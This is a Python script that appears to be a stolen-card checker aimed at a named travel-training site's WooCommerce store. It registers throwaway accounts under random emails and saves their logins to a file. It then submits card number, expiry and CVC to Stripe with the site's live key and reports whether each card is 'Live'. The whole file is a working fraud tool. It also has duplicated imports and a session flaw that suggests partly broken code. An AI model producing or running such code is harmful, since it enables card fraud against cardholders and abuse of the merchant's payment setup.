import requests
import re
import random
import time
import string
from bs4 import BeautifulSoup
import logging
import requests
import re
import random
import string
from bs4 import BeautifulSoup

def generate_random_email(length=8, domain=None):
    """Generates a random email address"""
    common_domains = ["gmail.com", "yahoo.com", "outlook.com"]
    if not domain:
        domain = random.choice(common_domains)
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return f"{random_string}@{domain}"

def create_session():
    """Creates a session, registers an account, and saves credentials to a file"""
    try:
        session = requests.Session()
        email = generate_random_email()
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})

        if not nonce or not noncee:
            print("Error: Nonce values not found on page.")
            return None

        nonce = nonce['value']
        noncee = noncee['value']

        headers.update({
            'content-type': 'application/x-www-form-urlencoded',
            'referer': 'https://www.thetravelinstitute.com/register/',
        })

        data = {
            'afurd_field_nonce': nonce,
            'email': email,
            'password': 'Esahatam2009@',
            'woocommerce-register-nonce': noncee,
            'register': 'Register',
        }

        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        response.raise_for_status()

        if response.status_code == 200:
            with open('Creds.txt', 'a') as f:
                f.write(f'{email}:Esahatam2009@\n')
            return session
        else:
            print("Error: Registration request failed.")
            return None

    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
        return None

def Tele(ccx):
    """Handles payment method addition by interacting with the Stripe API"""
    ccx = ccx.strip()

    try:
        parts = ccx.split("|")
        if len(parts) < 4:
            raise ValueError("Invalid input format. Expected format: CardNumber|Month|Year|CVC")
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]

        # Validate inputs
        if not (1 <= int(mm) <= 12):
            raise ValueError("Invalid month (must be 1-12).")
        if len(yy) == 4:
            yy = yy[-2:]  # Convert YYYY to YY format
        if len(cvc) not in [3, 4]:
            raise ValueError("Invalid CVC length (must be 3 or 4 digits).")

    except ValueError as e:
        print(f"Error: {e} - Input: {ccx}")
        return None

    session = requests.Session()

    try:
        # Fetch nonce for payment method addition
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
        }

        response = session.get(
            'https://www.thetravelinstitute.com/my-account/add-payment-method/',
            headers=headers,
            timeout=20
        )
        response.raise_for_status()

        # Extract nonce
        html = response.text
        nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html)
        if not nonce_match:
            print("Error: Nonce not found on payment method page.")
            return None
        nonce = nonce_match.group(1)

        # Send request to Stripe API
        stripe_headers = {
            'authority': 'api.stripe.com',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        stripe_data = {
            'type': 'card',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'billing_details[address][postal_code]': '10080',
            'billing_details[address][country]': 'US',
            'key': 'pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        }

        stripe_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data,
            timeout=20
        )
        stripe_response.raise_for_status()
        stripe_data = stripe_response.json()

        # Final request to confirm setup intent
        params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        form_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': stripe_data.get('id', ''),
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        final_response = session.post(
            'https://www.thetravelinstitute.com/',
            params=params,
            data=form_data,
            timeout=20
        )
        final_response.raise_for_status()
        
        return final_response.json().get('msg', 'Live')

    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None

# Example usage:
# session = create_session()
# if session:
#     print("Session created successfully!")

# result = Tele("4242424242424242|12|2026|123")
# print(result)
